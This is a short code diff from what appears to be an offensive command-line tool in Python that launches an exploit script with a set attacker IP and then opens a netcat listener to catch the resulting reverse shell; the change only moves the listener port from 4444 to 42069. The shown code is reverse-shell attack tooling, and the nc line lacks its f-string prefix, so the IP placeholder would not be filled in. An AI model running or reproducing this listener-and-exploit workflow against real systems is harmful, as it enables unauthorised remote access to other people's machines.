@@ -126,7 +126,7 @@ class MyCLI(cmd.Cmd):
             print(colored("Attacker IP not set. Use 'setip <your ip>' to set attacker IP.", 'yellow'))
             return
         os.system(f"python {self.exploit} {self.attacker_ip} &")
-        os.system("nc -lvp 4444 -s {self.attacker_ip}") 
+        os.system("nc -lvp 42069 -s {self.attacker_ip}") 
         
     def do_settarget(self, arg):
         self.target = arg
